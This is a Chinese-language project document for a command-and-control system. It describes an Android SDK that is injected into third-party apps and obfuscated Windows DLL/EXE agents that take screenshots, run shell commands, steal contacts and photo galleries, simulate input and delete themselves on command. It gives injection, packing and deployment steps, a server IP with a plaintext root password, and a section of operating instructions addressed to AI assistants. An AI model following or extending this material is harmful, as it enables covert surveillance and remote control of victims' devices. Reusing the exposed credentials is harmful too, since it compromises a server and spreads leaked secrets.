# 项目全局文档

## 架构概述

```
┌─────────────────────┐     HTTP      ┌──────────────────────────┐
│  客户端（Android）   │ ←──────────→ │                          │
├─────────────────────┤              │   card_server (Node.js)   │
│  客户端（Windows）   │ ←──────────→ │   运行在 VPS              │
├─────────────────────┤              │   端口 3000 (PM2 守护)    │
│  客户端（未来扩展）   │              │   Nginx 反代 :80/:443    │
└─────────────────────┘              └──────────────────────────┘
                                               ↑
                                        管理员浏览器
                                      /admin（需 Token）
```

- **服务端**：Node.js 单文件 `server.js`，JSON 文件数据库，PM2 进程守护
- **Android 客户端**：Java SDK，注入目标 APK，心跳轮询
- **Windows 客户端**：纯 C，编译为 `c2sdk.dll`（供其他程序调用）或 `c2agent.exe`（独立后台进程）
- **全平台共用接口**：`/device/register`、`/device/heartbeat`、`/device/ack`、`/device/upload`

---

## 目录结构

```
项目根/
├── app/                        Android 客户端（Android Studio 项目）
│   └── src/main/java/com/example/msphone/
│       ├── DeviceC2.java       核心 C2 心跳/命令执行
│       ├── Vault.java          混淆字符串解码门面
│       ├── RemoteConfig.java   服务端下发配置模型
│       ├── MyAccessibilityService.java  无障碍截图/手势
│       ├── RootUtils.java      Root 双路命令执行
│       └── ...其他 SDK 类
├── card_server/                服务端
│   ├── server.js               主程序（单文件）
│   ├── public/admin.html       管理后台 Web 界面
│   ├── data/db.json            JSON 数据库（自动创建）
│   ├── .env                    环境变量（Token、AES Key 等）
│   └── .env.example            环境变量模板
├── win_client/                 Windows 客户端
│   ├── src/                    C 源码
│   │   ├── c2.h                核心逻辑（心跳/命令/上传）
│   │   ├── c2sdk.c             DLL 入口
│   │   ├── c2agent.c           EXE 入口
│   │   ├── vault.h             blob 解码
│   │   ├── blobs.h             混淆常量（gen_blobs.py 生成）
│   │   ├── config.h            编译时配置
│   │   ├── http.h              WinInet HTTP
│   │   ├── json.h              极简 JSON 解析
│   │   ├── device_id.h         设备 UUID（注册表持久化）
│   │   └── kami.h              卡密存储/验证/弹框
│   ├── gen_blobs.py            生成 blobs.h
│   ├── build.bat               一键 MinGW 编译
│   ├── bin/                    编译输出目录
│   └── examples/               各语言接入示例
│       ├── use_dll.py          Python ctypes 调用 DLL
│       ├── use_dll.go          Go syscall 调用 DLL
│       └── use_exe.vbs         VBScript/易语言启动 EXE
└── tools/                      工具脚本
    ├── inject_sdk.py           一键将 Android SDK 注入第三方项目
    ├── gen_blobs.py            生成 Android secure.c 的混淆常量
    └── README.md               工具使用说明
```

---

## 服务端

### 环境信息

| 项目 | 值 |
|------|-----|
| VPS IP | 50.114.113.121 |
| SSH 用户 | root |
| 服务路径 | /root/card_server/ |
| Node 版本 | v20+ |
| 进程守护 | PM2（进程名 `card_server`） |
| 对外端口 | 80（Nginx 反代） |
| 管理后台 | http://50.114.113.121/admin |

### 部署/更新

```bash
# 本地改完 server.js 后上传并重启
scp card_server/server.js root@50.114.113.121:/root/card_server/
scp card_server/public/admin.html root@50.114.113.121:/root/card_server/public/
ssh root@50.114.113.121 "pm2 restart card_server"

# 查看实时日志
ssh root@50.114.113.121 "pm2 logs card_server --lines 50"

# 查看进程状态
ssh root@50.114.113.121 "pm2 list"
```

### Nginx 配置路径

```
/www/server/panel/vhost/nginx/50.114.113.121.conf
```

关键点：API 路由和图片路径必须用 `^~` 前缀修饰符，否则 Nginx 静态文件规则会拦截 `.png` 上传文件：

```nginx
location ^~ /admin/api/ { proxy_pass http://127.0.0.1:3000/admin/api/; ... }
location ^~ /device/    { proxy_pass http://127.0.0.1:3000/device/; ... }
location ^~ /kami/      { proxy_pass http://127.0.0.1:3000/kami/; ... }
```

修改后：`nginx -s reload`

### 环境变量（`card_server/.env`）

```env
ADMIN_TOKEN=你的管理token
AES_KEY=16位AES密钥
PUBLIC_BASE_URL=http://50.114.113.121
AI_API_KEY=（可选）AI生成弹窗HTML的API Key
AI_API_BASE_URL=https://ai.1314mc.net
AI_MODEL=gpt-4o-mini
```

修改 `.env` 后需要：`pm2 restart card_server --update-env`

### 接口列表

| 路径 | 方法 | 说明 |
|------|------|------|
| `/device/register` | POST | 客户端注册/上线 |
| `/device/heartbeat` | POST | 客户端心跳（获取待执行命令） |
| `/device/ack` | POST | 客户端确认命令已执行 |
| `/device/upload` | POST | 客户端上传结果（截图/文本/JSON） |
| `/kami/verify` | POST | 卡密验证 |
| `/` | GET/POST | 获取弹窗配置（App 启动时调用） |
| `/admin/api/*` | 各种 | 管理接口，需 Bearer Token |

---

## 管理后台

地址：`http://50.114.113.121/admin`，输入 `ADMIN_TOKEN` 登录。

### 分组配置说明

每种软件（Android App、Windows 程序）对应一个**分组**，以 `software_type` 字段区分。

| 配置项 | 说明 |
|--------|------|
| 轮询秒 | 客户端心跳间隔（秒），最小 5，默认 60 |
| 启用 C2 | 总开关，关闭后所有命令被拒绝 |
| 截图/联系人/Shell/触控 | 各能力开关 |
| **自动发卡** | 设备注册时自动签发永久卡，无需用户输入卡密（调试/免卡密场景） |
| **过期行为** | 卡密到期后的动作：不处理 / 阻断指令 / 卸载软件 |
| 弹窗标题/提示 | 卡密验证弹窗文案 |

### 可下发的命令类型

| 命令 | 参数 | 说明 |
|------|------|------|
| `screenshot` | 无 | 截图并上传 |
| `shell` | `cmd`: 命令字符串 | 执行 shell 命令，结果上传 |
| `input_tap` | `x`, `y` | 模拟点击坐标 |
| `input_swipe` | `x1`,`y1`,`x2`,`y2`,`duration`(ms) | 模拟滑动 |
| `message` | `text` | 弹出消息（Android=Toast/通知，Win=MessageBox） |
| `get_contacts` | 无 | 获取通讯录（Android） |
| `get_gallery` | `limit`(默认100) | 获取相册列表（Android） |
| `kick` | 无 | 退出软件（不卸载） |
| `self_destruct` | 无 | 卸载/删除自身 |
| `update_config` | `config`: 配置对象 | 动态更新客户端配置 |
| `wake` | 无 | 立即触发下次心跳（自动追加，无需手动下发） |

---

## Android 客户端

### 快速接入新项目

```bash
# 将 SDK 注入目标 Android 项目
cd tools
python inject_sdk.py /path/to/TargetApp com.target.package

# 然后在 MainActivity.onCreate() 加一行：
DeviceC2.start(this);
```

### 修改服务器地址（每次换服务器必做）

```bash
# 1. 编辑 tools/gen_blobs.py，修改 secrets[0] 为新服务器地址
# 2. 生成新的加密常量
python tools/gen_blobs.py
# 3. 将输出内容替换 app/src/main/cpp/secure.c 中对应的 B0[]~B7[]、BLOBS[]、LENS[]、NBLOBS
# 4. 重新编译
./gradlew assembleDebug
```

### 心跳/命令流程

```
App 启动 → DeviceC2.start(ctx)
    → /device/register（注册+获取待命令）
    → sleep(poll_interval 秒，可被 wake 命令提前唤醒）
    → /device/heartbeat（获取待命令）
    → 执行命令（异步线程）
    → /device/upload（上传结果）
    → /device/ack（确认命令完成，服务端清除队列）
    → 循环
```

### 关键配置字段（`RemoteConfig.java`）

| 字段 | 类型 | 说明 |
|------|------|------|
| `poll_interval` | int | 心跳间隔秒 |
| `enable_c2` | bool | C2 总开关 |
| `allow_screenshot` | bool | 允许截图 |
| `allow_contacts` | bool | 允许读通讯录 |
| `allow_shell` | bool | 允许执行 Shell |
| `allow_input_control` | bool | 允许模拟触控 |
| `expire_action` | string | 过期行为（none/block/uninstall） |
| `auto_issue_card` | bool | 自动发卡（服务端逻辑） |

---

## Windows 客户端

### 修改服务器地址（必做）

```bash
# 1. 编辑 win_client/gen_blobs.py，修改 secrets[0]
# 2. 生成 blobs.h
cd win_client
python gen_blobs.py
# 自动覆盖 src/blobs.h
```

### 编译

需要 [MinGW-w64](https://winlibs.com) 并将 `gcc` 加入 PATH。

```bat
cd win_client
build.bat
# 输出：bin/c2sdk.dll 和 bin/c2agent.exe
```

编译产物大小：
- 未压缩：约 120-180 KB
- UPX 压缩后：约 40-60 KB（`upx --best bin/c2agent.exe`）

### 接入方式

#### 方式 A：DLL（推荐，代码接入）

```python
# Python
import ctypes
dll = ctypes.CDLL("c2sdk.dll")
dll.C2_Start.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p]
dll.C2_Start(b"myapp", None, b"1.0.0")
# 第二个参数 None = 自动发卡或弹框让用户输入
```

```go
// Go
dll := syscall.MustLoadDLL(`c2sdk.dll`)
start := dll.MustFindProc("C2_Start")
swType, _ := syscall.BytePtrFromString("myapp")
ver, _ := syscall.BytePtrFromString("1.0.0")
start.Call(uintptr(unsafe.Pointer(swType)), 0, uintptr(unsafe.Pointer(ver)))
```

#### 方式 B：EXE（免代码，Shell 启动）

```
# 命令行参数：software_type  kami  version
# kami 留空（两个空格）表示自动发卡或弹框
c2agent.exe myapp  1.0.0

# Python
import subprocess
subprocess.Popen(["c2agent.exe", "myapp", "", "1.0.0"])

# 易语言
运行程序 ("c2agent.exe myapp  1.0.0", 假, 假)

# VBScript
CreateObject("WScript.Shell").Run """c2agent.exe"" myapp  1.0.0", 0, False
```

### C2 公开 API（DLL 导出函数）

```c
// 启动 C2 后台线程
// software_type: 分组标识，对应管理后台的分组名
// kami:          卡密字符串，NULL = 读缓存/弹框/auto_issue_card
// version:       版本字符串，NULL = "1.0.0"
// 返回 1=成功，0=已在运行
int C2_Start(const char* software_type, const char* kami, const char* version);

// 停止 C2
void C2_Stop(void);

// 运行时更新卡密（用户续费后调用）
void C2_SetKami(const char* kami);
```

### Windows 支持的命令

| 命令 | 实现方式 |
|------|---------|
| `screenshot` | GDI `BitBlt` 截图，BMP 格式上传 |
| `shell` | `cmd.exe /c`，30s 超时，输出上传 |
| `input_tap` | `SetCursorPos` + `SendInput` 鼠标点击 |
| `input_swipe` | `SendInput` 鼠标按下，插值移动，松开 |
| `message` | `MessageBoxA`（弹窗） |
| `kick` | 退出进程 |
| `self_destruct` | 写 bat 延迟删除自身 EXE |
| `expire_block` | 弹窗提示授权过期，阻断后续命令 |
| `wake` | 立即触发下次心跳 |

---

## 卡密管理

### 卡密类型

| 类型 | duration_days | expires_at | 使用场景 |
|------|--------------|-----------|---------|
| 永久卡 | 0 | 空 | 自动发卡、VIP 永久授权 |
| 月卡 | 30 | 有值 | 订阅制 |
| 天卡 | N | 有值 | 按天计费 |
| 自动卡 | 0 | 空 | 系统自动签发，note=`__auto__` |

### 卡密过期行为配置

在分组配置里设置 `expire_action`：

- `none`：过期不做任何处理（客户端继续运行，只是卡密不能重新验证）
- `block`：下发 `expire_block` 命令，客户端弹提示并阻断所有 C2 指令
- `uninstall`：下发 `self_destruct` 命令，Android 自动卸载，Windows 自动删除 EXE

### 自动发卡

分组开启 `auto_issue_card` 后：
1. 设备首次注册时，服务端检测无卡密
2. 自动生成一张 `duration_days=0`（永久）的卡，绑定该设备
3. 客户端无需弹框、无需用户输入
4. 适用场景：调试、内部工具、不需要授权的客户端

---

## 常见操作

### 给设备下发截图命令

管理后台 → C2 标签 → 选设备 → 下拉选"截图" → 发送  
约 1 秒内（wake 机制）设备响应，截图出现在上传历史。

### 远程控制（取坐标+点击）

管理后台 → C2 → 设备详情 → "📡 远程控制"  
→ 先截图 → 点击截图上的位置自动填入坐标 → 勾选"自动发送" → 每次点击直接执行

### 清除卡住的命令队列

管理后台 → C2 → 设备详情 → "清除命令队列"  
或：全局总览 → 待执行命令 → "清除队列"

### 调试时加快响应速度

管理后台 → 分组 → 对应分组 → 轮询秒改为 `5` → 保存  
（客户端下次心跳后生效；wake 机制让普通命令无需等待轮询间隔）

### 服务端重启后卡密数据是否丢失

不会。数据存在 `/root/card_server/data/db.json`，重启只是重启进程。

---

## AI 操作指引

> 以下说明专门为 AI 辅助操作准备，描述每个操作的精确步骤。

### 部署服务端更新

```
目标：将本地改动的 server.js / admin.html 部署到 VPS

1. 上传文件（PowerShell）：
   $pass = ConvertTo-SecureString "s8n7N4c3J4nbyabed3a5" -AsPlainText -Force
   $cred = New-Object System.Management.Automation.PSCredential("root", $pass)
   Set-SCPItem -ComputerName "50.114.113.121" -Credential $cred \
     -Path "card_server/server.js" -Destination "/root/card_server/" -Force
   Set-SCPItem -ComputerName "50.114.113.121" -Credential $cred \
     -Path "card_server/public/admin.html" -Destination "/root/card_server/public/" -Force

2. 重启服务：
   ssh root@50.114.113.121 "pm2 restart card_server"

3. 验证：
   ssh root@50.114.113.121 "pm2 list && pm2 logs card_server --lines 10 --nostream"
```

### 修改服务器地址并重新编译 Android APK

```
1. 编辑 tools/gen_blobs.py，将 secrets[0] 改为新服务器地址
2. 运行 python tools/gen_blobs.py，复制输出
3. 打开 app/src/main/cpp/secure.c，替换 B0[]~B7[]、BLOBS[]、LENS[]、NBLOBS
4. 运行 ./gradlew assembleDebug
5. APK 在 app/build/outputs/apk/debug/app-debug.apk
```

### 修改服务器地址并编译 Win 客户端

```
1. 编辑 win_client/gen_blobs.py，将 secrets[0] 改为新服务器地址
2. 运行 python win_client/gen_blobs.py（自动覆盖 src/blobs.h）
3. 确保 gcc 在 PATH：gcc --version
4. 运行 win_client/build.bat
5. 输出：win_client/bin/c2sdk.dll 和 win_client/bin/c2agent.exe
```

### 将 Android SDK 注入新项目

```
1. 确认目标项目路径，如 D:\dev\TargetApp
2. 确认目标包名，如 com.company.app
3. 运行：python tools/inject_sdk.py D:\dev\TargetApp com.company.app
4. 在 TargetApp 的 MainActivity.onCreate() 中添加：
   DeviceC2.start(this);
5. 重新编译目标项目
```

### 查看设备日志

```bash
# 服务端实时日志
ssh root@50.114.113.121 "pm2 logs card_server --lines 100"

# 管理后台内置日志（最近 300 条）
# 浏览器访问：http://50.114.113.121/admin → 全局总览 → 服务器日志
```
